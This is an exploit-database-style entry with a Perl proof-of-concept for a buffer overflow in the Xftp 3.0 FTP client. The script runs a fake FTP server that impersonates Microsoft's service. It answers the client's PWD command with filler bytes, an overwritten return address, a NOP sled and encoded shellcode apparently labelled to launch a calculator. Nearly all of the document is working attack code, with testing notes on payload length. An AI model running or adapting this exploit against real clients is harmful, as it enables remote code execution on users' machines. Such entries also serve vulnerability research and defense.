# Exploit Title: Xftp client 3.0 PWD Remote Exploit
# Date: 2010-04-21
# Author: zombiefx
# Software Link: http://www.netsarang.com/download/down_xft3.html
# Version: Xftp 3.0 build 0238
# Tested on: Windows XP SP3
# Usage: ./xftp_exploit
# The BOF occurs when sending an overly long PWD response.
###########################################################################
# EDB Testing Notes:
# Buffer is length sensitive. If too long (example: 3000 bytes) you won't
# even get a crash at all. Tested on Windows XP SP3 ENG.
###########################################################################
# Code:
#!/usr/bin/perl
use warnings;
use strict;
use IO::Socket;
my $sock = IO::Socket::INET->new( LocalPort => '21', Proto => 'tcp', Listen => '1' )
  or die "Socket Not Created $!\n";
print "#############################################################\n"
    . "#Xftp client 3.0 PWD Exploit                                #\n"
    . "#Listening on port 21                                       #\n"
    . "#By:zombiefx  Email: darkernet[at]gmail.com                 #\n"
    . "#Major Greetz to  corelanc0d3r/Dino Dai Zovi                #\n"
    . "#############################################################\n";
my $junk = "\x41" x 1019;
my $eip  = pack( 'V', 0x100123AF ) x 4;    #Universal ..i think
my $nops = "\x90" x 55;
my $calcshell =
    "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"
  . "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
  . "\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
  . "\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
  . "\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
  . "\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"
  . "\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"
  . "\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"
  . "\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"
  . "\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"
  . "\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"
  . "\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"
  . "\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"
  . "\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"
  . "\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"
  . "\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"
  . "\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"
  . "\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"
  . "\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"
  . "\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"
  . "\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"
  . "\x31\x42\x4c\x42\x43\x45\x50\x41\x41";

my $payload = $junk . $eip . $nops . $calcshell;

while ( my $data = $sock->accept() ) {
    print "Client Connected!\nAwaiting Ftp commands: \n";
    print $data "220 Microsoft FTP Service\r\n";
    while (<$data>) {
        print;
        print $data "331 Anonymous access allowed.\r\n"                            if (/USER/i);
        print $data "230-Welcome to FTP.MICROSOFT.COM.\r\n230 User logged in.\r\n" if (/PASS/i);
        print $data "257 \"/$payload\" is current directory.\r\n"                  if (/PWD/i);
    }
    print "Payload delivered check the client!\n";
}